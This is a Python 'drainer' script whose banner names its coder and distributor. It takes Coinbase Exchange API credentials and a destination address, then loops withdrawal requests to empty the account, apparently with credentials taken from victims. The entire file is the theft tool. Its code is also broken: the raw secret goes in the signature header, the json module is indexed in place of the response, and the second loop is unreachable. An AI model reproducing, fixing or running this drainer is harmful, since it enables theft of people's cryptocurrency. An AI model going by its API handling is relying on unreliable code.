import requests; import time; import json; import random; import os

def main(): 
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''

       /$$                    /$$                           /$$
      | $$                   |__/                          | $$
  /$$$$$$$  /$$$$$$  /$$$$$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
 /$$__  $$ /$$__  $$|____  $$| $$| $$__  $$ /$$__  $$ /$$__  $$
| $$  | $$| $$  \__/ /$$$$$$$| $$| $$  \ $$| $$$$$$$$| $$  | $$
| $$  | $$| $$      /$$__  $$| $$| $$  | $$| $$_____/| $$  | $$
|  $$$$$$$| $$     |  $$$$$$$| $$| $$  | $$|  $$$$$$$|  $$$$$$$
 \_______/|__/      \_______/|__/|__/  |__/ \_______/ \_______/                              
                                                                                                     
Original Coder: @snazzybloke | Forked/Distributed by: @gabswastaken | fuck outbase imagine selling a drainer

	''')
        key = input("<~> API KEY > ")
        secret = input("<~> API SECRET > ")
        password = input("<~> API PASSWORD > ")
        address = input("<~> ADDRESS > ")
        currency = input("<~> CRYPTO [BTC,LTC,etc.] > ")
        amount = input("<~> CRYPTO AMOUNT > ")

        payload = {
            "currency": currency,
            "crypto_address": address,
            "amount": amount
        }

        while 1:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "CB-ACCESS-KEY": key,
                    "CB-ACCESS-SIGN": secret,
                    "CB-ACCESS-PASSPHRASE": password,
                    "CB-ACCESS-TIMESTAMP": str(time.time())
                }
                response = requests.request("POST", "https://api.exchange.coinbase.com/withdrawals/crypto", json=payload, headers=headers)
                parsed = json.loads(response.text)
                if "message" in parsed.keys():
                        if parsed["message"] == "Invalid API Key":
                                string = "<|> Your API key is invalid, please try again"
                                print(string)
                        elif parsed["message"] == "Insufficient funds":
                                string = "<|> All funds have been successfully withdrawn or there are no withdrawable funds in the account."
                                print(string)
                        else:
                                print("OTHER ERROR - "+parsed["message"])
                else:
                        string = "<+> Successfully sent "+json["amount"]+" "+json["currency"]+" to "+address+" (Transaction ID: "+json["id"]+")"
                        print(string)

        while 2:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "CB-ACCESS-KEY": key,
                    "CB-ACCESS-SIGN": secret,
                    "CB-ACCESS-PASSPHRASE": password,
                    "CB-ACCESS-TIMESTAMP": str(time.time())
                }
                response = requests.request("POST", "https://api.exchange.coinbase.com/withdrawals/crypto", json=payload, headers=headers)
                parsed = json.loads(response.text)
                if "message" in parsed.keys():
                        if parsed["message"] == "Invalid API Key":
                                string = "<|> Your API key is invalid, please try again"
                                print(string)
                        elif parsed["message"] == "Insufficient funds":
                                string = "<|> All funds have been successfully withdrawn or there are no withdrawable funds in the account"
                                print(string)
                        else:
                                print("OTHER ERROR - "+parsed["message"])
                else:
                        string = "<+> Successfully sent "+json["amount"]+" "+json["currency"]+" to "+address+" (Transaction ID: "+json["id"]+")"
                        print(string)

main()
